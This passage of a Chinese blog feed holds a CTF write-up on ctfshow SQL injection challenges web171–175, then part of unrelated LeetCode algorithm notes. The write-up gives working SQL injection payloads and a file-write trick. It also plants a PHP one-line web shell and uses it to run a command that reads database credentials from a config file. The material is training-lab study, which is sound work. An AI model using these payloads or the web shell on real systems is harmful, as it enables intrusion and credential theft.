class="operator">=</span> <span class="string">&#x27;1&#x27;</span> ;<span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>; #<span class="string">&#x27; limit 1;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select username,password from user where username !=&#x27;</span>flag<span class="string">&#x27; and id = &#x27;</span><span class="number">1</span><span class="string">&#x27; union select username,password from user where username =&#x27;</span>flag<span class="string">&#x27;; #&#x27;</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>这里看其他师傅的WP，学到了已知<code>and</code>优先级高于<code>or</code>，所以先<code>username !='flag' and id='1' </code>再<code>or 1=1</code><br>所以<code>假or真</code>，结果为真，恒为真 所有的内容都会被输出<br>所有的user表中的username，password都被输出了，得到flag的内容.</p><p>payload：<code>1' or 1=1 --+</code></p><p>其他几种可行的payload：<code>9999' or id = '26</code>、<code>1' or username='flag' --+</code></p><blockquote><p>实测这里使用#注释会报错，实际情况中要多尝试</p></blockquote><h2 id="web172">web172</h2><h3 id="题目描述">题目描述</h3><p><strong>撸猫为主，要什么flag?</strong></p><h3 id="解题思路">解题思路</h3><p>此题开放了两个模块，第一个模块用上一个payload继续打，发现<code>flag_not_here</code>,直接进入下一个模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!==&#x27;flag&#x27;)&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>sql语句不变，添加了返回逻辑判断</p><p>我们可以使用联合查询的姿势，将<code>username</code>和<code>password</code>的顺序调换，偷梁换柱以绕过返回过滤</p><p>payload：<code>9999' union select password,username from ctfshow_user2 where username ='flag' --+</code></p><p>sql语句拼接后如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> ctfshow_user2 <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;9999&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> password,username <span class="keyword">from</span> ctfshow_user2 <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> <span class="comment">--+&#x27; limit 1;</span></span><br></pre></td></tr></table></figure><h2 id="web173">web173</h2><h3 id="题目描述">题目描述</h3><p><strong>考察sql基础</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>加强了返回结果的判断，但换汤不换药，关键的是<code>password</code>中内容，略微修改payload即可</p><p><code>9999' union select id,id,password from ctfshow_user3 where username='flag' --+</code></p><blockquote><p>或许可以用MySQL字符串函数绕过，如to_base64()、hex()</p></blockquote><h2 id="web174">web174</h2><h3 id="题目描述">题目描述</h3><p><strong>考察sql基础，不要一把梭，没意思</strong></p><h3 id="解题思路">解题思路</h3><p>再次加强了过滤，ban掉了数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这还是挺伤的，由于flag中肯定包含数字，故以上绕过姿势失效</p><p>我们可以搜索<a href="https://www.yzktw.com.cn/post/957917.html">Mysql字符串函数</a>找找有没有什么函数可用，发现<code>replace()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> REPLACE(<span class="string">&#x27;Hello World&#x27;</span>,<span class="string">&#x27;World&#x27;</span>,<span class="string">&#x27;MySQL&#x27;</span>) <span class="keyword">AS</span> <span class="keyword">result</span>;</span><br><span class="line"><span class="comment">-- Output: Hello MySQL</span></span><br></pre></td></tr></table></figure><p>我们可以用其他字符替换数字来正常回显，再写脚本还原即可</p><p><img src="https://s2.loli.net/2023/09/23/Oi4ojFqLQuHlRfb.png" alt="在本地构造sql语句"></p><p>构造后payload：<code>9999'union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','!'),'2','@'),'3','#'),'4','$'),'5','%'),'6','^'),'7','&amp;'),'8','*'),'9','('),'0',')') from ctfshow_user4 --+</code></p><p>尝试打一下一直报接口错误，抓个包看一下。。。</p><p><img src="https://s2.loli.net/2023/09/23/koH2tpVJAmDNTbj.png" alt="抓包"></p><p>破案了应该是payload太长，中间截断了没有完全上传</p><p>更改一下payload：<code>9999'union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','!'),'2','@'),'3','#'),'4','$'),'5','%'),'6','^'),'7','&amp;'),'8','*'),'9','('),'0',')') from ctfshow_user4 where username='flag</code></p><p>全部url编码后BP发包即可得到回显<code>ctfshow&#123;!)d#f$f#-a)$(-$cbe-be@@-b&amp;@b*d&amp;@@$##&#125;</code></p><p>写一个python脚本将<code>flag</code>还原</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;ctfshow&#123;!)d#f$f#-a)$(-$cbe-be@@-b&amp;@b*d&amp;@@$##&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = flag.replace(<span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># ctfshow&#123;10d3f4f3-a049-4cbe-be22-b72b8d722433&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web175">web175</h2><h3 id="题目描述">题目描述</h3><p><strong>最后一个无过滤注入，到此你已经熟悉了基础的sql语句。</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>本来思路和上一题一样，是将结果中的过滤字符替换为中文等字符，但将其转化为json格式中应该必定存在过滤字符，导致无法回显，所以思路为更换其他信道得到结果，如公网带外，文件写入等。本题使用文件写入</p><p><strong>预期解</strong></p><p><code>99' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+</code>访问1.txt即可看到flag，用该方法以上对输出结果进行过滤的题目均可用该种方法绕过过滤</p><p><strong>非预期解</strong></p><p>通过写入一句话木马<br><code>99' union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile '/var/www/html/1.php' --+</code><br>这样可能会引起数据异常，保险起见可以将<code>&lt;?php eval($_POST[1]);?&gt;</code>base64编码后再url编码，再用sql函数<code>from_base64()</code>传入，用bp检查数据是否完整</p><p>传入木马之后可以RCE，可以查看<code>./api/config.php</code>，找到数据库账号和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;tac ./api/config.php&#x27;);</span><br><span class="line"># $charName = &quot;utf-8&quot;; $dbname = &quot;ctfshow_web&quot;; $dbpwd = &quot;root&quot;; $dbuser = &quot;root&quot;; $dbhost =&quot;127.0.0.1&quot;; */ # @link: https://ctfer.com # @email: h1xa@ctfer.com # @Last Modified time: 2020-11-01 19:29:25 # @Last Modified by: h1xa # @Date: 2020-11-01 14:21:14 # @Author: h1xa # -*- coding: utf-8 -*- /*</span><br></pre></td></tr></table></figure><p>用蚁剑连接后，用数据处理查询该表下所有数据即可</p><p><img src="https://s2.loli.net/2023/10/12/IoFEgdtypjMmC7H.png" alt="sql"></p><p><img src="https://s2.loli.net/2023/10/12/Dtegu84sM9XwnKm.png" alt="Sql (2)"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode刷题笔记</title>
      <link href="/2023/09/17/Leetcode/Week1-10/"/>
      <url>/2023/09/17/Leetcode/Week1-10/</url>
      
        <content type="html"><![CDATA[<blockquote><p>从零开始刷一下leetcode非会员题（尽量使用最优算法）</p></blockquote><h1>Week1</h1><h2 id="1-两数之和"><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和</a></h2><p>暴力枚举可过，时间复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>哈希表：思路为遍历数组，判断当前元素前有无元素与其之和等于target，而哈希表查找元素的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，我们可以每当遍历一个元素而找不到与其之和满足要求的元素时，将其存入哈希表以便后续查找，这样即可将算法总时间复杂度优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><blockquote><p>tips：C++语法中自带两个哈希表数据结构，分别为有序map(底层为红黑树实现)，查找时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>n</mi></mrow><annotation encoding="application/x-tex">\log_{2}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.93858em;vertical-align:-0.24414em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span></span></span></span></span>，而无序哈希表unordered_map时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，本题用后者</p></blockquote><p>题解：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res; <span class="comment">// 存放两数的下标</span></span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; hash; <span class="comment">// 哈希表</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> r=target-nums[i];<span class="comment">//计算与当前元素相加为target的值</span></span><br><span class="line">            <span class="keyword">if</span>(hash.<span class="built_in">count</span>(r)) <span class="comment">//若找到目标元素，将两数下标存入</span></span><br><span class="line">            &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(hash[r]);</span><br><span class="line">                res.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            hash[nums[i]]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2-两数相加"><a href="https://leetcode.cn/problems/add-two-numbers/">2. 两数相加</a></h2><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure><p>给出数据以<strong>链表</strong>形式<strong>倒序</strong>存储，从个位依次运算即可（注意细节）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode* Newhead=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);<span class="comment">//新建存放结果链表的哨兵头节点</span></span><br><span class="line">        ListNode* cur=Newhead;<span class="comment">//记录返回链表当前节点位置</span></span><br><span class="line">        <span class="type">int</span> t=<span class="number">0</span>;<span class="comment">//储存进位</span></span><br><span class="line">        <span class="keyword">while</span>(l1||l2||t)<span class="comment">//当l1、l2没有遍历完或进位不为0时，继续循环</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(l1) <span class="comment">//当l1没遍历完时</span></span><br><span class="line">            &#123;</span><br><span class="line">                t+=l1-&gt;val;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l2) <span class="comment">//当l2没遍历完时</span></span><br><span class="line">            &#123;</span><br><span class="line">                t+=l2-&gt;val;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur-&gt;next=<span class="keyword">new</span> <span class="built_in">ListNode</span>(t%<span class="number">10</span>);</span><br><span class="line">            t/=<span class="number">10</span>;</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Newhead-&gt;next;<span class="comment">//返回哨兵节点的下一个</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3-无重复字符的最长子串"><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h2><p>初见可能比较难，先了解一下双指针算法和滑动窗口算法</p><p><strong>基本思路</strong>：要找出给定字符串<code>s</code>中不含重复字符的最长子串。基本思路肯定是遍历所有子串，并找出符合条件的。我们以字串尾字符为基准进行遍历，若暴力遍历时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><strong>优化办法</strong>：假设尾节点为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>时，无重复字符最长子串头节点为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>，当我们遍历尾节点为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">j+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>的所有子串时，满足条件的头节点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">i&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>仅可能出现在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>或其右侧，这样使两个指针遍历时“不走回头路”，类似滑动窗口，可将算法时间复杂度优化至<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><p><strong>其他细节</strong>：我们可以用哈希表来维护指针<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>之间元素出现的个数，便于判断其间有无重复元素，每次<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>指针向前移动一次，将其存入哈希表，若有重复元素则定为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>指向元素值，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>向前移动至该元素仅出现一次即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; hash;<span class="comment">//哈希表存放i、j间字符出现个数</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;<span class="comment">//左指针</span></span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;<span class="comment">//保存结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;s.<span class="built_in">size</span>();j++)</span><br><span class="line">        &#123;</span><br><span class="line">            hash[s[j]]++;<span class="comment">//对应字符的出现次数加1</span></span><br><span class="line">            <span class="keyword">while</span>(hash[s[j]]&gt;<span class="number">1</span>)<span class="comment">//当有重复字符</span></span><br><span class="line">            &#123;</span><br><span class="line">                hash[s[i++]]--;<span class="comment">//左指针移动，对应字符出现次数减1</span></span><br><span class="line">            &#125;</span><br><span class="line">            res=<span class="built_in">max</span>(res,j-i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-寻找两个正序数组的中位数-困难"><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/">4. 寻找两个正序数组的中位数</a>（困难）</h2><blockquote><p>中位数：有序数组元素个数为奇数时，中位数为最中间的数，若元素个数为偶数时，中位数为中间两个数的平均数</p></blockquote><p><strong>朴素算法</strong>：将两个数组合并，<code>sort</code>排序后遍历寻找中位数，时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mo><mi>log</mi><mo>⁡</mo></mo><mrow></mrow></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log_{}{n})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" 